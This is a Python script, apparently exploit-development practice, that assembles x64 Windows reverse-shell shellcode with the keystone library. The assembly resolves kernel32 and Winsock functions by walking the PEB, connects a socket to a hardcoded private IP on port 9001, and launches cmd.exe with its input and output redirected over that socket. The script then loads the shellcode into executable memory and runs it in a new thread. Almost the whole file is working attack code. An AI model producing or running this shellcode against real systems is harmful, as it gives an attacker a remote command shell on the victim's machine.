import ctypes, struct
import binascii
import os
import subprocess
from keystone import *
 
#####################################################################################
# ██████╗░░█████╗░██████╗░██████╗░███████╗██████╗░░██████╗░░█████╗░████████╗███████╗#
# ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝░██╔══██╗╚══██╔══╝██╔════╝#
# ██████╦╝██║░░██║██████╔╝██║░░██║█████╗░░██████╔╝██║░░██╗░███████║░░░██║░░░█████╗░░#
# ██╔══██╗██║░░██║██╔══██╗██║░░██║██╔══╝░░██╔══██╗██║░░╚██╗██╔══██║░░░██║░░░██╔══╝░░#
# ██████╦╝╚█████╔╝██║░░██║██████╔╝███████╗██║░░██║╚██████╔╝██║░░██║░░░██║░░░███████╗#
# ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝#
#####################################################################################
#                        x64 Reverse Shell Shellcode                                #
#####################################################################################
 
 
def main():
    SHELLCODE = (
    " start: "
    "  add rsp, 0xfffffffffffffdf8;"    # Avoid Null Byte
    " locate_kernel32:"
    "   xor rcx, rcx;"                  # Zero RCX contents
    "   mov rax, gs:[rcx + 0x60];"      # 0x060 ProcessEnvironmentBlock to RAX.
    "   mov rax, [rax + 0x18];"         # 0x18  ProcessEnvironmentBlock.Ldr Offset
    "   mov rsi, [rax + 0x20];"         # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
    "   lodsq;"                         # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
    "   xchg rax, rsi;"                 # Swap RAX,RSI
    "   lodsq;"                         # Load qword at address (R)SI into RAX
    "   mov rbx, [rax + 0x20] ;"        # RBX = Kernel32 base address
    "   mov r8, rbx; "                  # Copy Kernel32 base address to R8 register
 
    # Code for parsing Export Address Table
    "   mov ebx, [rbx+0x3C]; "          # Get Kernel32 PE Signature (offset 0x3C) into EBX
    "   add rbx, r8; "                  # Add defrerenced signature offset to kernel32 base. Store in RBX.
    "   xor r12,r12;"
    "   add r12, 0x88FFFFF;"
    "   shr r12, 0x14;"
    "   mov edx, [rbx+r12];"            # Offset from PE32 Signature to Export Address Table
     
    "   add rdx, r8;"                   # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
    "   mov r10d, [rdx+0x14];"          # Number of functions
    "   xor r11, r11;"                  # Zero R11 before use
    "   mov r11d, [rdx+0x20];"          # AddressOfNames RVA
    "   add r11, r8;"                   # AddressOfNames VMA
 
    # Loop over Export Address Table to find GetProcAddress Name
    "   mov rcx, r10;"                  # Set loop counter
    "kernel32findfunction: "
    " jecxz FunctionNameFound;"         # Loop around this function until we find WinExec
    "   xor ebx,ebx;"                   # Zero EBX for use
    "   mov ebx, [r11+4+rcx*4];"        # EBX = RVA for first AddressOfName
    "   add rbx, r8;"                   # RBX = Function name VMA
    "   dec rcx;"                       # Decrement our loop by one
    "   mov rax, 0x41636f7250746547;"   # GetProcA
    "   cmp [rbx], rax;"                # Check if we found GetProcA
    "   jnz kernel32findfunction;"
 
    "FunctionNameFound: "               # Find GetProcessAddress
    # We found our target
    "   xor r11, r11;"
    "   mov r11d, [rdx+0x24];"          # AddressOfNameOrdinals RVA
    "   add r11, r8;"                   # AddressOfNameOrdinals VMA
    # Get the function ordinal from AddressOfNameOrdinals
    "   inc rcx;"
    "   mov r13w, [r11+rcx*2];"         # AddressOfNameOrdinals + Counter. RCX = counter
    # Get function address from AddressOfFunctions
    "   xor r11, r11;"
    "   mov r11d, [rdx+0x1c];"          # AddressOfFunctions RVA
    "   add r11, r8;"                   # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
    "   mov eax, [r11+4+r13*4];"        # Get the function RVA.
    "   add rax, r8;"                   # Add base address to function RVA
    "   mov r14, rax;"                  # GetProcAddress to R14
 
    # Below to resolve LoadLibraryA using GetProcAddress
    " mov rcx, 0x41797261; "
    " push rcx; "
    " mov rcx, 0x7262694c64616f4c; "
    " push rcx; "
    " mov rdx, rsp; "                    # LoadLibraryA into RDX
    " mov rcx, r8; "                     # Copy Kernel32 base address to RCX
    " sub rsp, 0x30; "                   # Make some room on the stack
    " call r14;"                         # Call GetProcessAddress
    " add rsp, 0x30; "                   # Remove allocated stack space
    " add rsp, 0x10; "                   # Remove Allocated LoadLibrary string
    " mov rsi, rax; "                    # Save the address of loadlibrary in RSI
 
    # Call LoadLibraryA on WS2_32.DLL 
    " xor rax, rax;"
    " mov rax, 0x6C6C; "             # ll
    " push rax;"
    " mov rax, 0x642E32335F325357;"  # WS2_32.d
    " push rax;"
    " mov rcx, rsp;"                 # copy stack string to RCX
    " sub rsp, 0x30;"
    " call rsi;"                     # Call LoadLibraryA
    " mov r15, rax;"
    " add rsp, 0x30;"                # Clean allocated space on stack
    " add rsp, 0x10;"                # Clean space for ws2_32.dll
     
    # Get WSAStartup Address
    " mov rax, 0x7075;"
    " push rax;"
    " mov rax, 0x7472617453415357;"
    " push rax;"
    " mov rdx, rsp; "                    # WSAStartup into RDX
    " mov rcx, r15; "                    # Copy WS2_32 base address to RCX
    " sub rsp, 0x30; "                   # Make some room on the stack
    " call r14;"                         # Call GetProcessAddress
    " add rsp, 0x30; "                   # Remove allocated stack space
    " add rsp, 0x10; "                   # Remove Allocated LoadLibrary string
    " mov r12, rax; "                    # Save the address of WSAStartup in RSI
 
    # " int3;"
    # Call WSAStartup
    " xor rcx,rcx; "
    " mov cx,408; "
    " sub rsp,rcx; "
    " lea rdx,[rsp]; "                    # lpWSAData [out]
    " mov cx,514; "                       # wVersionRequired
    " sub rsp,88; "
    " call r12; "                         # Call WSAStartup
 
    # Lookup WSASocketA Address
    " mov rax, 0x4174;"
    " push rax;"
    " mov rax, 0x656b636f53415357;"
    " push rax;"                         # WSASocketA
    " mov rdx, rsp; "                    # WSASocketA into RDX
    " mov rcx, r15; "                    # Copy WS2_32 base address to RCX
    " sub rsp, 0x30; "                   # Make some room on the stack
    " call r14;"                         # Call GetProcessAddress
    " add rsp, 0x30; "                   # Remove allocated stack space
    " add rsp, 0x10; "                   # Remove Allocated LoadLibrary string
    " mov r12, rax; "                    # Save the address of WSASocketA in RSI
 
    # Create a socket with WSASocketA
    " sub rsp,0x208;"
    " xor rdx, rdx;"
    " sub rsp, 88;"
    " mov [rsp+32], rdx;"
    " mov [rsp+40], rdx;"
    " inc rdx;"
    " mov rcx, rdx;"
    " inc rcx;"
    " xor r8,r8;"
    " add r8,6;"
    " xor r9,r9;"
    " mov r9w,98*4;"
    " mov ebx,[r15+r9];"
    " xor r9,r9;"
    " call r12;"
    " mov r13, rax;"
    " add rsp, 0x208;"
 
    # Lookup WSAConnect Address
    " mov rax, 0x7463;"
    " push rax;"
    " mov rax, 0x656e6e6f43415357;"
    " push rax;"                         # WSAConnect
    " mov rdx, rsp; "                    # WSAConnect into RDX
    " mov rcx, r15; "                    # Copy WS2_32 base address to RCX
    " sub rsp, 0x30; "                   # Make some room on the stack
    " call r14;"                         # Call GetProcessAddress
    " add rsp, 0x30; "                   # Remove allocated stack space
    " add rsp, 0x10; "                   # Remove Allocated LoadLibrary string
    " mov r12, rax; "                    # Save the address of WSAConnect in R12
 
    # Call WSAConnect...
    " mov rcx, r13;"          # Our socket handle as parameter 1
    " sub rsp,0x208;"         # Make some room on the stack
    " xor rax,rax;"
    " inc rax; "
    " inc rax; "
    " mov [rsp], rax;"         # AF_INET = 2
    " mov rax, 0x2923;"        # Port
    " mov [rsp+2], rax; "      # Port
    " mov rax, 0xf401a8c0;"    # IP 
    " mov [rsp+4], rax ;"      # IP
    " lea rdx,[rsp];"          # Save our pointer to RDX
    " mov r8, 0x16; "          # Move 0x10 to namelen
    " xor r9,r9;"             
    " push r9;"                # NULL lpCallerData
    " push r9;"                # NULL lpCallerData
    " push r9;"                # NULL lpSQOS
    " sub rsp, 0x88; "         # NULL lpSQOS
    " call r12;"               # Call WSAConnect
 
    # Find CreateProcessA address in kernel32.dll
    # Lookup Kernel32 base address again...
    " xor rcx, rcx;"                  # Zero RCX contents
    " mov rax, gs:[rcx + 0x60];"      # 0x060 ProcessEnvironmentBlock to RAX.
    " mov rax, [rax + 0x18];"         # 0x18  ProcessEnvironmentBlock.Ldr Offset
    " mov rsi, [rax + 0x20];"         # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
    " lodsq;"                         # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
    " xchg rax, rsi;"                 # Swap RAX,RSI
    " lodsq;"                         # Load qword at address (R)SI into RAX
    " mov rbx, [rax + 0x20] ;"        # RBX = Kernel32 base address
    " mov r8, rbx; "                  # Copy Kernel32 base address to R8 register
 
    # Find address for CreateProcessA. Store in R12 (previously stored WSAConnect)
    " mov rax, 0x41737365636f;"
    " push rax;"
    " mov rax, 0x7250657461657243;"
    " push rax;"                         # CreateProcessA
    " mov rdx, rsp; "                    # CreateProcessA into RDX
    " mov rcx, r8; "                     # Copy Kernel32 base address to RCX
    " sub rsp, 0x30; "                   # Make some room on the stack
    " call r14;"                         # Call GetProcessAddress
    " add rsp, 0x30; "                   # Remove allocated stack space
    " add rsp, 0x10; "                   # Remove Allocated CreateProcessA string
    " mov r12, rax; "                    # Save the address of CreateProcessA in R12
 
    # Push cmd.exe string to stack
    " mov rax, 0x6578652e646d63; "
    " push rax; "
    " mov rcx, rsp; "                # RCX = lpApplicationName (cmd.exe)
 
 
    # STARTUPINFOA Structure
    " push r13;"                     # Push STDERROR
    " push r13;"                     # Push STDOUTPUT
    " push r13;"                     # Push STDINPUT
    " xor rax,rax; "
    " push ax;"
    " push rax;"
    " push rax;"
    " mov rax, 0x100;"
    " push ax;"
    " xor rax,rax;"
    " push ax;"
    " push ax;"
    " push rax;"
    " push rax; "                    # dwXSize = NULL
    " push rax; "                    # dwY = NULL
    " push rax; "                    # dwX = NULL
    " push rax; "                    # lpDesktop = NULL
    " push rax; "                    # lpReserved = NULL
    " mov rax, 0x68;"               
    " push rax;"                     # SizeOfStruct = 0x68
    " mov rdi,rsp;"                  # Copy the Pointer to RDI
 
 
    # Call CreateProcessA
    " mov rax, rsp;"                # Get current stack pointer
    " sub rax, 0x500;"
    " push rax; "                   # ProcessInfo
    " push rdi; "                   # StartupInfo          = Pointer to STARTUPINFOA
    " xor rax, rax; "
    " push rax; "                   # lpCurrentDirectory   = NULL
    " push rax; "                   # lpEnvironment        = NULL
    " push rax;"                    # may not be needed!
    " inc rax;  "
    " push rax; "                   # bInheritHandles      = 1
    " xor rax, rax; "
    " push rax;"
    " push rax;"
    " push rax;"
    " push rax; "                   # dwCreationFlags      = NULL
    " mov r8, rax; "                # lpThreadAttributes   = NULL              
    " mov r9, rax; "                # lpProcessAttributes  = NULL              
    " mov rdx, rcx; "               # lpCommandLine        = "cmd.exe" string  
    " mov rcx, rax; "               # lpApplicationName    = NULL              
    " call r12; "                   # Call CreateProcessA
 
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
    print(output)
    print(f"Length: {len(sh)}")

    shellcode = bytearray(sh)
    print("Shellcode: "  + output )
    print("Bytes: " + str(len(sh)))
    print("Attaching debugger to " + str(os.getpid()));
    subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    print(f"Thread handle: {handle}")
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
 
if __name__ == "__main__":
    main()